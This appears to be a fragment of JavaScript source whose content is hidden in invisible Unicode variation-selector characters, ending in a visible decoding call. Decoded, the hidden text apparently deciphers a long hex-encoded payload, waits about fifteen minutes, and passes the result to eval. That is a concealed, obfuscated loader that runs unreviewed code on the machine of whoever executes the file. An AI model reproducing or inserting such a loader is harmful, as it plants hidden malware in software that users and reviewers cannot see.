󠄧󠄨󠅑󠄥󠄢󠄠󠅑󠅒󠅒󠄤󠄧󠅕󠄡󠅔󠅖󠅑󠅓󠅓󠄩󠅓󠄩󠅓󠅕󠄡󠄤󠅑󠄨󠄤󠄡󠄢󠅓󠄨󠄩󠅖󠄥󠅓󠄤󠄨󠅑󠅑󠄢󠅓󠅖󠄨󠄩󠄨󠅖󠅖󠄠󠄤󠅖󠄣󠅑󠄥󠄡󠄥󠄢󠄢󠅔󠅕󠄣󠅕󠅑󠄤󠄩󠅓󠄩󠅓󠄠󠄥󠄠󠄤󠄥󠅑󠅖󠄨󠄢󠅖󠄩󠅑󠅖󠄧󠅑󠅒󠄡󠄥󠄢󠄢󠄦󠅔󠅑󠅕󠅕󠅕󠄠󠄡󠅖󠄥󠄠󠅔󠅒󠄥󠄦󠄨󠅕󠅓󠅓󠅒󠄠󠅖󠅓󠄤󠄢󠅖󠄣󠅓󠅔󠄤󠅑󠄤󠄩󠄨󠅕󠄠󠅓󠄠󠅖󠅔󠄠󠄥󠄥󠅖󠄩󠅔󠄥󠄡󠄨󠅑󠄨󠅔󠄩󠄩󠄨󠄧󠄦󠅖󠄤󠄩󠅒󠄦󠅑󠄦󠄡󠄧󠅒󠄣󠄠󠄨󠄣󠄧󠄡󠅖󠄤󠄤󠄡󠄤󠄡󠄤󠄤󠄡󠄠󠄧󠄩󠅕󠄩󠄨󠄤󠅔󠄢󠄦󠄡󠄩󠄠󠄠󠅕󠅒󠄣󠄠󠄧󠄦󠅓󠅒󠅕󠄩󠄨󠄤󠄥󠄨󠅔󠄨󠄧󠄧󠄤󠅑󠅖󠅓󠄢󠄤󠄨󠅑󠄩󠄣󠄨󠅔󠅕󠄥󠄢󠄩󠄨󠅑󠅔󠄧󠄠󠄨󠄧󠄣󠄥󠄥󠅕󠄩󠄧󠄥󠅒󠅕󠄩󠄣󠄠󠅓󠄢󠅖󠅑󠅑󠄧󠄦󠄤󠅓󠄦󠄠󠅖󠅑󠄩󠄢󠅓󠅖󠅓󠄥󠅒󠅒󠄥󠄢󠅒󠄩󠄡󠄣󠅑󠅕󠄥󠅕󠄠󠄥󠅔󠄩󠄧󠄩󠄧󠅔󠅑󠄩󠄢󠄢󠄠󠄤󠅕󠄡󠅖󠄩󠄠󠅓󠄣󠄠󠅖󠄩󠄨󠅓󠅔󠄤󠅖󠅔󠄠󠄣󠄦󠅖󠅔󠅒󠅓󠄤󠅓󠄩󠄩󠄠󠄦󠄤󠅓󠅕󠄣󠄦󠅖󠄡󠄧󠅓󠅓󠅔󠄠󠅑󠅖󠅖󠄣󠄡󠅓󠅖󠄣󠅓󠅕󠄢󠄡󠄢󠄧󠄢󠄣󠄠󠄢󠄩󠅔󠄤󠅑󠄤󠅕󠄡󠅔󠅑󠄥󠄢󠄣󠅖󠄤󠅖󠅓󠄠󠄧󠅔󠅕󠅔󠄥󠄦󠅕󠄦󠄥󠅕󠄩󠄡󠄢󠅑󠄡󠄤󠄠󠄥󠅓󠅖󠄠󠅔󠄦󠄩󠅑󠄠󠄢󠅕󠅖󠅔󠄥󠅓󠄩󠄩󠄨󠄧󠄧󠄣󠄣󠄦󠅖󠄨󠅕󠅒󠅑󠄩󠄦󠄡󠅑󠄧󠅑󠄣󠅖󠅔󠄩󠅓󠄣󠄩󠄨󠄣󠅔󠄥󠄡󠄣󠄥󠄨󠄡󠄣󠄧󠄤󠅖󠅔󠅔󠄨󠄥󠄥󠅖󠅖󠄧󠅔󠄠󠅑󠄣󠅖󠄥󠄧󠄠󠄧󠅒󠄣󠅓󠄤󠅑󠄤󠅖󠄗󠄜󠄗󠅘󠅕󠅨󠄗󠄜󠄗󠅥󠅤󠅖󠄨󠄗󠄙󠄫󠅒󠄛󠄭󠅔󠄞󠅖󠅙󠅞󠅑󠅜󠄘󠄗󠅥󠅤󠅖󠄨󠄗󠄙󠄫󠅩󠅙󠅕󠅜󠅔󠄐󠅞󠅕󠅧󠄐󠅀󠅢󠅟󠅝󠅙󠅣󠅕󠄘󠅢󠄭󠄮󠅣󠅕󠅤󠅄󠅙󠅝󠅕󠅟󠅥󠅤󠄘󠅢󠄜󠄩󠅕󠄥󠄙󠄙󠄫󠅩󠅙󠅕󠅜󠅔󠄐󠅕󠅦󠅑󠅜󠄘󠅒󠄙󠄫󠅭󠄙󠄘󠄙󠅍󠅋󠄠󠅍󠄞󠅤󠅘󠅕󠅞󠄘󠄘󠄙󠄭󠄮󠅫󠅭󠄙󠄫`)).toString('utf-8'));